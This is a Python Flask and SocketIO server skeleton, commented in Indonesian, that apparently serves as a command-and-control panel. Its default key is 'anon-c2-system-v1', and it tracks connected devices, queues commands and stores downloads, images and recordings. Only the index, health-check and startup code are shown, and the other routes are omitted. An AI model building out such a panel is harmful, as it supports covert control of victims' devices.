#!/usr/bin/env python3
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
import json
import os
import base64
from datetime import datetime
import threading
import logging
from queue import Queue
import requests

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anon-c2-system-v1')

# SocketIO tanpa gevent dulu
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=None)

# --- Konfigurasi ---
FLASK_PORT = int(os.environ.get('PORT', 9191))
SERVER1_URL = os.environ.get('SERVER1_URL', 'http://localhost:9090')
DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'

# --- Global Variables ---
connected_devices = {}
device_data_queues = {}
current_device = None
command_queue = Queue()

# --- Setup Logging ---
logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Directory Setup ---
for dir_name in ['web_downloads', 'web_images', 'web_recordings']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# ==================== ROUTES ====================

@app.route('/')
def index():
    """Halaman utama"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check endpoint untuk Railway"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'devices_connected': len(connected_devices)
    })

# ... (semua route lainnya sama seperti sebelumnya) ...

# ==================== Main ====================

if __name__ == '__main__':
    logger.info(f"Starting Flask server on port {FLASK_PORT}")
    logger.info(f"Debug mode: {DEBUG}")
    
    # Gunakan socketio.run untuk development
    socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=DEBUG)
